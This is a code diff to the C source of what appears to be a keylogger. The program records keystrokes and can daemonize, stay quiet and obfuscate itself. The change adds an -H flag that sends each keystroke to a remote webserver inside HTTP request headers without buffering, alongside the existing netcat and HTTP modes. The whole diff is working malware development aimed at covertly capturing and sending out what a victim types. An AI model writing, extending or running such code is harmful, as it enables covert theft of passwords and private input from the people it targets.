@@ -95,7 +95,8 @@ int main (int argc, char ** argv) {
 					transmit_keystroke_inet(keystroke, &config);
 
 				if(config.log_remote_http)
-					transmit_keystroke_http(keystroke, &config, 0);
+					transmit_keystroke_http(keystroke, &config, 
+						config.log_remote_http_nodelay ? 1 : 0);
 			}
 	}
 }
@@ -123,9 +124,10 @@ struct tm* initialize(int argc, char ** argv, struct config_struct* config) {
 	config->port = 0;
 	config->daemonize = 0;
 	config->obfuscate = 0;
+	config->log_remote_http_nodelay = 0;
 
 	/* parse cmdline arguments */
-	while((c = getopt(argc, argv, "s:f:h:?r:qdo")) != -1){
+	while((c = getopt(argc, argv, "s:f:H:h:?r:qdo")) != -1){
 		switch(c) {
 		  case 's':
 			if(strcmp(optarg, X_DEFAULT_DISPLAY) == 0)
@@ -139,6 +141,8 @@ struct tm* initialize(int argc, char ** argv, struct config_struct* config) {
 			strncpy(config->logfile, optarg, strlen(optarg));
 			break;
 #ifdef _HAVE_CURL
+		  case 'H':
+			config->log_remote_http_nodelay = 1;
 		  case 'h':
 			config->host = smalloc(sizeof(char) * strlen(optarg) + 1);
 			strcpy(config->host, optarg);
@@ -173,6 +177,7 @@ struct tm* initialize(int argc, char ** argv, struct config_struct* config) {
 			log(0, stderr, "                   BSD netcat: 'nc -p <port> -k')\n");
 #		   ifdef _HAVE_CURL
 			log(0, stderr, "   -h <HOST>       Log keystrokes to webserver within HTTP requests headers.\n");
+			log(0, stderr, "   -H <HOST>       like -h, but without buffering.\n");
 #		   endif
 			log(0, stderr, "   -d              Daemonize (requires -f or -r or both).\n");
 			log(0, stderr, "   -q              Be quiet (no output to console).\n");
